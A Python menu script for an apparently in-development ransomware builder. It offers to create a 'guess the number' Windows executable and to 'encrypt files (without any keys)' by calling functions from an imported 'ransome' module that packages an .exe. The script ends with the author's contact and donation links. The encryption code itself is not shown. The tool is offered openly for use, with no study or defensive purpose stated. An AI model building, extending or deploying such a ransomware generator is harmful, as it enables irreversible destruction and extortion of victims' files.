import os
import random
import subprocess
import shutil
import sys
import logo
import guess
import ransome

# Display logo (Make sure you have a 'logo' module with the 'root()' function)
logo.root()

os.system('cls' if os.name == 'nt' else 'clear')


def main():
    print(f" \033[1;34m[1] Guess the number game (Windows version) and create .exe")
    print("")
    print(" [2] Encrypt files (without any keys)")
    print("")
    print(" [3] Encrypt files (with keys)")
    print("")
    x = input("Please select your option: ")

    if x == "1":
        guess.create_exe()
        guess.one_option()
    elif x == "2":
        ransome.rans()
        ransome.create_exe()
    elif x == "3":
        print("")
        print("Option [3] under development")
    else:
        print("")
        print("Invalid option. Please try again.")

    print("")
    print("[Note:]")
    print(f"\033[0;33mthe tool under development if you want to participate or help, contact me")
    print(f"here: https://www.x.com/@lose_sec")
    print(f"")
    print(f"if you want to support the project, i will be happy and grateful for your support  ")
    print(f"support link: https://ko-fi.com/lose_sec")
    print(f"")
    print(f"if you want some modifications to the design, contact me through the firts link")
    print(f" ")
    print(f"THINK YOU :)")

if __name__ == "__main__":
    main()


